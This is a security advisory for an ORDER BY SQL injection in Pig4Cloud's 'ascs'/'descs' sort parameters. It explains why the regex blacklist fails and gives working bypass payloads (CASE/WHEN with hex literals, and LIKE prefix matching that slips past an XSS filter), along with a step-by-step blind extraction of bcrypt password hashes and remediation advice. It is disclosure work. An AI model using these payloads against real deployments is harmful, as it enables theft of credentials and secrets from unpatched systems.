# Pig4Cloud — SQL Injection via `ascs` / `descs` Pagination Sort Parameters

## Vulnerability Description

The vulnerability lies in the way Pig4Cloud handles pagination sort parameters. The framework registers a global `SqlFilterArgumentResolver` that parses the `ascs` / `descs` HTTP request parameters and passes their values as sort column names into MyBatis-Plus `OrderItem` objects. Because the `ORDER BY` clause cannot use prepared-statement parameters (`#{}`), the value ultimately enters the SQL statement via **raw string concatenation**. The only protection is MyBatis-Plus's `SqlInjectionUtils.check()` — a **regex blacklist** implementation that is trivially bypassed.

## Impact

Any authenticated user — including the lowest-privileged ordinary user — can exploit this vulnerability to read arbitrary data from the database. An attacker can achieve the following:

- **Full read of arbitrary table data**: Verified complete extraction of `sys_user.password` (bcrypt hash, 60 characters), a field that is **not returned in the API response** and exists only inside the SQL query.
- Boolean-based blind extraction of the result of any SQL expression, bit by bit, via `hex()` combined with `LIKE` prefix matching.
- Read OAuth2 client secrets (`sys_oauth_client_details.client_secret`).
- Read database version, current user, schema name, and other infrastructure information.
- Because `ORDER BY` injection cannot be fixed by parameterization and the protection is a blacklist, the bypass cost is extremely low.

**Verification completed** (self-built lab, Pig v4.1.0 + MySQL 8.4.5):

| Verification item                                       | Result                                                       |
| ------------------------------------------------------- | ------------------------------------------------------------ |
| Parameter concatenated raw into SQL                     | ✅ Error echoes back `ORDER BY user_iddesc DESC`              |
| Blacklist bypass                                        | ✅ `or` / `oR` / `select` all pass unfiltered                 |
| Expression evaluation                                   | ✅ `CASE` branch precisely controls the `ORDER BY` target column |
| **Full extraction of a field absent from the response** | ✅ **`password` matched 120/120 positions** (791 requests, 7 seconds) |

This issue is classified as **SQL Injection (CWE-89)**.

### Relation to Prior Art

This is the same class of issue as **CVE-2020-16165** (SpringBlade through 2.7.1,
SQL injection in an ORDER BY clause via the `ascs` / `desc` parameters of
`/api/blade-log/api/list`). The parameter naming and the underlying MyBatis-Plus
`OrderItem` mechanism are the same.

The distinction, and the reason this is a separate issue rather than a duplicate, is
that **Pig4Cloud does implement a protection** — MyBatis-Plus `SqlInjectionUtils`, a
regex blacklist — and that protection is bypassable. SpringBlade had no filtering at
all. This is therefore a *protection-failure* issue rather than an *absent-protection*
issue.

The same MyBatis-Plus ORDER BY injection class has been reported and fixed elsewhere
using a **whitelist**, which is the remediation recommended below:

| CVE            | Project       | Parameter                  | Fix                           |
| -------------- | ------------- | -------------------------- | ----------------------------- |
| CVE-2020-16165 | SpringBlade   | `ascs` / `desc`            | Fixed after 2.7.1             |
| CVE-2026-7060  | yu-picture    | `sortField`                | Regex whitelist               |
| CVE-2026-63039 | Apache InLong | `orderField` / `orderType` | Whitelist validation in 2.4.0 |

Pig4Cloud has no CVE for SQL injection to date; its three existing CVEs
(CVE-2025-63690, CVE-2025-63691, CVE-2026-15512) concern Quartz reflection RCE,
token authorization, and Velocity SSTI respectively.

### Affected Surface Characteristics

`ascs` / `descs` are **framework-level parameters parsed automatically**; application developers do not declare them on individual endpoints. Therefore:

- **All** Controller methods whose parameter type is `com.baomidou.mybatisplus.extension.plugins.pagination.Page` are affected.
- That is, every paginated endpoint ending in `/page`.
- The flaw persists across framework upgrades — **v4.1.0 (latest release, 2026-07) remains unpatched**.

## Technical Analysis

The flaw resides in `SqlFilterArgumentResolver.resolveArgument()`. The method reads the `ascs` / `descs` parameters from the request, applies the `SqlInjectionUtils.check()` blacklist filter, and constructs `OrderItem` objects directly:

```java
// v3.9.x: pig-common-mybatis/.../resolver/SqlFilterArgumentResolver.java:71-92
// v4.1.0: pig-common-data/.../resolver/SqlFilterArgumentResolver.java:73-101
String[] ascs  = request.getParameterValues("ascs");
String[] descs = request.getParameterValues("descs");
...
List<OrderItem> orderItemList = new ArrayList<>();
Optional.ofNullable(descs)
    .ifPresent(s -> orderItemList
        .addAll(Arrays.stream(s)
            .filter(desc -> !SqlInjectionUtils.check(desc))   // ← the only protection
            .map(OrderItem::desc)                             // ← raw value into column
            .toList()));
page.addOrder(orderItemList);
```

`OrderItem.column` is assigned the **raw, unescaped string**, which MyBatis-Plus's `PaginationInnerInterceptor` then concatenates into SQL:

```java
sql.append(" ORDER BY ").append(orderItem.getColumn()).append(" DESC");
```

### Why the Protection Fails

`SqlInjectionUtils.check()` performs blacklist matching with two regular expressions:

```java
// Regex 1: comment-truncation check
private static final Pattern SQL_COMMENT_PATTERN =
    Pattern.compile("'.*(or|union|--|#|/\\*|;)", Pattern.CASE_INSENSITIVE);

// Regex 2: syntax check
private static final Pattern SQL_SYNTAX_PATTERN =
    Pattern.compile("(insert|delete|update|select|create|drop|truncate|grant|alter|deny|revoke|call|execute|exec|declare|show|rename|set)"
        + "\\s+.*(into|from|set|where|table|database|view|index|on|cursor|procedure|trigger|for|password|union|and|or)|(select\\s*\\*\\s*from\\s+)"
        + "|if\\s*\\(.*\\)|select\\s*\\(.*\\)|substr\\s*\\(.*\\)|substring\\s*\\(.*\\)|char\\s*\\(.*\\)|concat\\s*\\(.*\\)|benchmark\\s*\\(.*\\)|sleep\\s*\\(.*\\)|(and|or)\\s+.*",
        Pattern.CASE_INSENSITIVE);
```

There are three structural defects:

| Defect                                                      | Description                                                  | Bypass                                                       |
| ----------------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **Regex 1 requires a leading single quote**                 | `".*(or\|union\|--\|#\|/\*\|;)"` cannot trigger until a `'` appears | Send no single quote — comment-based filtering never activates |
| **Regex 2 enumerates only a limited set of function names** | It blacklists `if(`, `select(`, `substr(`, `concat(`, `sleep(`, etc. | `case(`, `when(`, `then(`, `left(`, `right(`, `ascii(`, `length(` are all unfiltered |
| **Regex 2's `(and\|or)\s+.*` requires trailing whitespace** | A bare `or` does not match                                   | Passing `or` alone passes straight through                   |

### Bypass Strategy

The payload ultimately used satisfies all of the following conditions and contains **none of the blacklist signatures**:

1. Uses a `CASE ... WHEN ... THEN ... ELSE ... END` expression (no `if(`, no `select(`).
2. Uses `left()` / `right()` instead of the blocked `mid()` / `substr()`.
3. Uses `0x` hexadecimal literals instead of `'string'` (avoiding Regex 1's single-quote requirement).
4. Uses `CASE WHEN` **implicit equality** instead of `=` / `>` operators.

```
case(right(left(version(),1),1))when(0x38)then(user_id)else(username)end
```

## Reproduction

### Environment

```
Pig4Cloud v4.1.0 (official GitHub latest, released 2026-07-08)
pig-boot monolithic mode + MySQL 8.4.5 + Redis 7 + JDK 17
```

### Step 1: Confirm the Parameter Is Concatenated Raw into SQL

**Request**:

```http
GET /admin/user/page?current=1&size=5&descs=user_id%20desc HTTP/1.1
Host: <host>:9999
Authorization: Bearer <valid token>
```

**Response** (key excerpt):

```json
{"code":1,"msg":"\n### Error querying database.
 Cause: java.sql.SQLSyntaxErrorException: Unknown column 'user_iddesc' in 'order clause'
...
### SQL: SELECT u.user_id, u.username, u.password, u.salt, u.phone, u.avatar, ...
         FROM sys_user u WHERE u.del_flag = '0'
         ORDER BY user_iddesc DESC, u.create_time DESC LIMIT ?
","ok":false}
```

The parameter value `user_id desc` was **concatenated verbatim** into `ORDER BY user_iddesc DESC` (not even a whitespace character was added), proving that no escaping or parameterization takes place.

> **Secondary issue**: The error response echoes the full executable SQL and stack trace, including sensitive fields such as `u.password` and `u.salt`. This is itself an information disclosure and should be fixed alongside the injection.

### Step 2: Confirm the Blacklist Bypass

| Payload  | Concatenated result    | Response                               |
| -------- | ---------------------- | -------------------------------------- |
| `or`     | `ORDER BY or DESC`     | **500** — not filtered                 |
| `oR`     | `ORDER BY oR DESC`     | **500** — case variant also unfiltered |
| `select` | `ORDER BY select DESC` | 500 — not filtered                     |

If the blacklist were effective, the parameter would be dropped by `filter()`, the query would fall back to the default sort, and the response would be `200`. It instead returns a SQL syntax error, proving the parameter reached the database.

### Step 3: Expression Evaluation (Core Evidence)

> **Prerequisite**: Verification must use a table with **enough rows**. If the table holds only one row, every sort order is identical, **no ordering difference is observable**, and the test has no discriminating power.
> This step uses the `sys_dict_item` table (**74 rows**), with the discriminating columns `id` and `dict_id` (**both numeric**, to avoid type-coercion interference).

**Establish baselines**:

| Request                                      | Returned record IDs |
| -------------------------------------------- | ------------------- |
| `GET /admin/dict/item/page?current=1&size=4` | `2, 3, 13, 18`      |
| `&descs=id`                                  | `100, 99, 98, 97`   |
| `&descs=dict_id`                             | `95, 96, 93, 94`    |

**Inject a CASE expression**:

| Payload                                  | Returned       | Verdict                                      |
| ---------------------------------------- | -------------- | -------------------------------------------- |
| `case(1)when(1)then(id)else(dict_id)end` | `100,99,98,97` | ✅ THEN branch taken (= ordered by `id`)      |
| `case(1)when(0)then(id)else(dict_id)end` | `95,96,93,94`  | ✅ ELSE branch taken (= ordered by `dict_id`) |
| `case(1)when(2)then(id)else(dict_id)end` | `95,96,93,94`  | ✅ Condition false, ELSE taken                |

The branch taken by the CASE expression **precisely determines** the `ORDER BY` target column — proving the expression is genuinely evaluated.

> ⚠️ **The discriminating columns must both be numeric.** Measured: `case(1)when(1)then(id)else(label)end` returns `99,98,97,96`, which **does not match** the `100,99,98,97` produced by the bare `descs=id` — when the two CASE branches have mismatched types, the result is implicitly coerced. Text columns such as `label` / `description` / `create_time` / `dict_type` are all affected; numeric columns such as `dict_id` / `sort_order` behave normally. After choosing columns, first confirm that `case(1)when(1)then(A)else(B)end` produces the same sequence as `descs=A`.

### Step 4: Read Database Data

Place a database function in the expression position and read its return value from the branch difference:

| Payload                                                     | Returned       | Verdict                                         |
| ----------------------------------------------------------- | -------------- | ----------------------------------------------- |
| `case(length(version()))when(5)then(id)else(dict_id)end`    | `100,99,98,97` | ✅ `length(version()) = 5`                       |
| `case(ascii(version()))when(56)then(id)else(dict_id)end`    | `100,99,98,97` | ✅ First character ASCII 56 = `'8'`              |
| `case(database())when(0x706967)then(id)else(dict_id)end`    | `100,99,98,97` | ✅ `database() = 'pig'`                          |
| `case(version())when(0x382e342e35)then(id)else(dict_id)end` | `100,99,98,97` | ✅ Full-string exact match `version() = '8.4.5'` |

**Extracted results**:

```
version()  →  8.4.5
database() →  pig
```

> The above results come from an isolated lab environment and do not represent any production system.

### Measured Payload Constraints

During reproduction it was found that **v4.1.0 parses parameters differently from v3.9.x**, which restricts the usable payload forms:

```java
// v3.9.x — array form, parameters preserved as-is
String[] descs = request.getParameterValues("descs");

// v4.1.0 — split on comma first
String descs = request.getParameter("descs");
... Arrays.stream(s.split(StrUtil.COMMA))
```

**Impact**: the `descs` value is **split on commas**, so the payload **must not contain a comma**:

```sql
-- the comma in right(left(version(),1),1) is treated as a sort-item separator
ORDER BY case(ascii(right(left(version() DESC, 1) DESC, 1)))when(56)...end DESC
                              ↑                    ↑
```

**Primitives verified working on v4.1.0**:

| Primitive               | Form                           |
| ----------------------- | ------------------------------ |
| Length test             | `case(length(expr))when(N)...` |
| First-character ASCII   | `case(ascii(expr))when(N)...`  |
| Full-string exact match | `case(expr)when(0x<hex>)...`   |

**Measured as unusable**: searched CASE (`case when <cond> then ... end`, rejected by the Druid parser), `left()` / `right()` (contain commas), and arithmetic operations.

### ★ Measured Differences in Discrimination Reliability (Important)

Reproduction revealed that **not all CASE discriminators are equally reliable**; always calibrate empirically before submitting:

| Primitive                                             | Reliability      | Measured evidence                                            |
| ----------------------------------------------------- | ---------------- | ------------------------------------------------------------ |
| `case(expr)when(0x<hex>)` **full-string exact match** | ✅ **Reliable**   | `database()='pig'` and `version()='8.4.5'` both matched correctly |
| `case(ascii(expr))when(N)` **first character**        | ✅ **Reliable**   | `ascii(version())=56('8')`, `ascii(database())=112('p')`     |
| `case(length(expr))when(N)` **length test**           | ⚠️ **Off by one** | `version()` true length 5 → matched 5 ✅; `user()` true length 14 → **matched 15** ❌ |

**Observed behaviour**: `length()` returns an integer, and the result of comparing it
against a `WHEN` operand does not reliably match the true string length — the
discrepancy grows with larger numeric values. The exact cause was not determined
during testing; the observation is reported as measured, without asserting a
mechanism.

**Recommendations**:

- **Length tests are indicative only** and must not be the sole basis for determining string length.
- **Full string extraction should use hex full-string exact matching** (enumerating candidate values), or use `ascii()` to read the first character purely to confirm reachability.
- Any PoC should be calibrated against an environment with **known ground-truth values** before formal submission.

### Step 5: Full Extraction of Data Absent from the Response

The `version()` / `database()` values read above are **predictable, already-known values**. To preempt any "self-validation" objection, this section reads a field that **does not exist at all** in the API response.

**Target**: `sys_user.password` (bcrypt hash)

```
API response fields:  userId, username, phone, email, nickname, ...   ★ no password
SQL query fields:     SELECT u.user_id, u.username, u.password, u.salt, ... FROM sys_user u
```

#### Obstacle and Root Cause

Testing showed that characters such as `> < = & * + - ; #` disappeared in transit. **Source-code analysis attributed this to the XSS filter, not the SQL layer**:

```java
// pig-common-xss/.../DefaultXssCleaner.java
String escapedHtml = Jsoup.clean(bodyHtml, "", XssUtil.WHITE_LIST, getOutputSettings(properties));
if (properties.isEnableEscape()) { return escapedHtml; }
return Entities.unescape(escapedHtml);      // ← clean first, then unescape
```

`FormXssClean` registers a `PropertyEditorSupport` via `@InitBinder`, causing query params such as `descs` to be **parsed as HTML** by `Jsoup.clean()`; `<` `>` `=` `&` are stripped as tag/attribute syntax, and `unescape` restores only one layer — **the original characters are permanently lost**.

**Character survival map** (sending `A<c>B`, observed from the SQL echo):

```
✗ stripped (9):  #  &  *  +  -  ;  <  =  >
✓ survives (82): ! $ % ( ) . / 0-9 : ? @ A-Z [ ] ^ _ ` a-z { | } ~
```

#### Bypass: LIKE Prefix Matching + `_` Wildcard

The stripped set **does not include `LIKE` or `_`**, and `( )` survive (no spaces needed):

```sql
case((hex(password))LIKE(0x<hex>%))when(1)then(user_id)else(phone)end
```

| Element         | Role                                                         |
| --------------- | ------------------------------------------------------------ |
| `hex(expr)`     | Convert the target to hexadecimal (charset limited to `0-9a-f`) |
| `LIKE 0x<hex>%` | Prefix matching (`0x` avoids the stripped single quote)      |
| `_`             | Skips a position occupied by a filtered character            |

#### Extraction Result (120/120 positions)

```
extracted:    24326124313024632f41653070526a4a744d5a6733426e7656704f2e65494b3657595756624b547a716764793361665237772e76642e7869334d6779
ground truth: 24326124313024632f41653070526a4a744d5a6733426e7656704f2e65494b3657595756624b547a716764793361665237772e76642e7869334d6779
```

| Metric               | Result                           |
| -------------------- | -------------------------------- |
| Length               | **120 / 120 exact match**        |
| Position-by-position | **✅ all match, no placeholders** |
| Requests / duration  | 791 requests / 7 seconds         |

**Conclusion: a field absent from the API response can be fully extracted.**

> **Note on an earlier measurement**: an initial run of this extraction left 14 `_`
> placeholders. That run was performed **before** the `lower()` correction — MySQL's
> `hex()` returns **uppercase**, and since `0x...` is a binary literal, comparison
> against a lowercase pattern is **case-sensitive**, so every `a`–`f` digit failed to
> match while `0`–`9` succeeded. The 14 placeholder positions corresponded exactly to
> the 14 `a`–`f` digits in the ground truth. Applying `lower()` around `hex()` resolved
> it, yielding the exact result above. This is documented here because it is a subtle
> pitfall for anyone re-implementing the extraction.

#### Preconditions (CVSS Determination)

| Request                 | Response                                   |
| ----------------------- | ------------------------------------------ |
| Without `Authorization` | `{"msg":"token expired", ...}`             |
| Forged token            | `{"msg":"token expired","data":"invalid"}` |
| With valid token        | `200` normal response                      |

→ **Any valid login credential is required → CVSS `PR:L`**

## Affected Versions

v1.1.6 through v4.1.0 (latest release as of 2026-07-08)

- **v3.9.2** (2025-10-31): confirmed affected.
- **v4.1.0** (2026-07-08): confirmed affected; the code logic is identical to v3.9.2, with only the package name and parameter-parsing method changed.

```java
// v4.1.0 pig-common-data/.../SqlFilterArgumentResolver.java:98-101
Optional.ofNullable(descs)
    .ifPresent(s -> orderItemList.addAll(Arrays.stream(s.split(StrUtil.COMMA))
        .filter(desc -> !SqlInjectionUtils.check(desc))   // ← identical to v3.9.2
        .map(OrderItem::desc)
        .toList()));
```

> v4.1.0 is a major release upgrading from Spring Boot 3.5 to Spring Boot 4.0; the issue was neither discovered nor fixed during that work.

## Remediation

The vulnerability was unpatched at the time of discovery. The recommended fixes are:

1. **Recommended (root fix)**: Replace blacklist filtering with a **column-name whitelist**. Maintain an enumeration of sortable fields at the entity or Mapper layer and accept only values within that enumeration:

   ```java
   private static final Set<String> ALLOWED_COLUMNS = Set.of(
       "user_id", "username", "create_time", "update_time"
   );
   // ...
   .filter(ALLOWED_COLUMNS::contains)
   ```

2. **Fallback**: If maintaining a column enumeration is infeasible, at minimum restrict the character set to alphanumerics and underscore:

   ```java
   private static final Pattern SAFE = Pattern.compile("^[A-Za-z0-9_]+$");
   .filter(desc -> SAFE.matcher(desc).matches())
   ```

   This still permits arbitrary column names (usable for schema probing) but blocks all expression injection.

3. **Error handling**: Configure a global exception handler to **stop returning raw SQL and stack traces to clients** (currently the complete SQL is echoed into the response `msg` field).
